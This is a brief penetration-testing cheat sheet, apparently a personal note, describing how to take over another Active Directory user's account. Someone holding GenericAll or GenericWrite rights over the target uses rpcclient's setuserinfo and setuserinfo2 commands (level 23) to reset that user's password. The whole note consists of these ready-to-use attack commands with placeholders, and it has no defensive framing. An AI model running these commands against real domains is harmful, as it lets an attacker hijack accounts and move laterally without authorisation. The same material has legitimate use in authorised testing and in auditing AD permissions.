Useful when we dont have winrm privileges to access a machine. 

> [!Requirements]
> Valid AD credentials of a user with:
> - GenericAll or GenericWrite over the target user
> - Belongs to a group that has GenericAll or GenericWrite over the target user 

Access to the target:
```bash
$ rpcclient -U "AD_USER%PASSWORD" TARGET

or

$ rpcclient -U DOMAIN_FQDN/AD_USER TARGET
*enter password*
```

Change the password:
```bash
setuserinfo TARGET_USER 23 NEW_PASSWORD
```

If it dont work:
```
setuserinfo2 TARGET_USER 23 NEW_PASSWORD2
```